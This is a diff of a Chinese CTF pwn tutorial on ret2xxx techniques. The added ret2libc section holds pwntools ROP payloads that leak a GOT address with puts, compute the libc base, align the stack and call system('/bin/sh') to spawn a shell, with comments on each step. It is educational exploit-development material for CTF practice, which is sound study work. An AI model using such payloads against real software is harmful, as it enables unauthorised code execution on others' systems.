@@ -1,8 +1,8 @@
 ---
-title: Pwn ret2xxx总结
+title: ret2xxx总结
 date: 2023-10-31T17:02:51+08:00
-categories: [CTF]
-tags: [CTF]
+categories: [CTF, Pwn]
+tags: [CTF, Pwn]
 ---
 
 ## ret2text
@@ -195,6 +195,40 @@ s.interactive()
 
 实际上，构造 ret2syscall 通常是十分繁琐复杂的。既然大部分程序都会使用 libc，那么我们完全可以直接利用 libc 中的 `system` 函数和 `/bin/sh` 字段。
 
+因为 libc 开启了地址随机化，所以需要首先泄漏出 libc 的基址，然后通过对应版本的 libc 计算偏移来利用 libc 中的各种参数和函数。
+
+```python
+payload1 = flat([
+    b'\0'*0x28,
+    # 泄漏 got 表
+    rdi, elf.got.read,
+    elf.plt.puts,
+    # 重新执行 main 函数以继续利用 read 函数
+    elf.sym.main
+])
+
+```
+`u64()` 接收一个 8 字节字符序列并解包为对应的地址。而地址的高位一定是 \0，例如 0x00007f706a508fc0，输出时会被 puts 截断。所以可以保证 `recvline()` 得到的字符序列去掉行尾 \n 后一定是 8 字节以内的。
+
+最后使用 `ljust(8, b"\0"))` 向高位补齐 \0 即可得到的地址是真实的 read 地址，减去 read 在 libc 中的偏移量即可得到 libc 基址。
+
+```python
+libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - libc.sym.read
+
+payload2 = flat([
+    b'\0'*0x28,
+    # system 函数中有使用到 movups xmmword 相关汇编指令，需要对栈进行对齐
+    # 这里 rdi + 1 是一个 retn 语句，根据 rop 链的特性，可以返回到自己
+    # 从而让栈多了一字节，实现对齐操作（另见栈对齐）
+    rdi + 1,
+    # libc.search 搜索 elf 文件中的文本，返回的是一个迭代器
+    # 使用 next() 得到第一个 /bin/sh 所在的地址
+    rdi, next(libc.search(b'/bin/sh')),
+    # 当设置了 libc.address 后，plt, got, sym 的地址均会自动更新
+    libc.sym.system
+])
+```
+
 ## ret2csu
 
 一般的程序都会使用到 libc，而 libc 的初始化函数 `__lib_csu_init` 中存储两个我们可以用于修改寄存器的 gadgets。
@@ -215,7 +249,7 @@ s.interactive()
 .text:00000000004012E4                 retn
 ```
 
-其中，如果我们选择截断倒数第二行的 `pop r15`，也就是跳转到 0x4012E3，我们可以得到 `pop rdi; retn` 这样一个十分有用的 gadget。
+其中，如果我们选择截断倒数第二行的 `pop r15`，也就是跳转到 0x4012E3，可以得到 `pop rdi; retn` 这样一个十分有用的 gadget。
 
 **gadgets2**
 
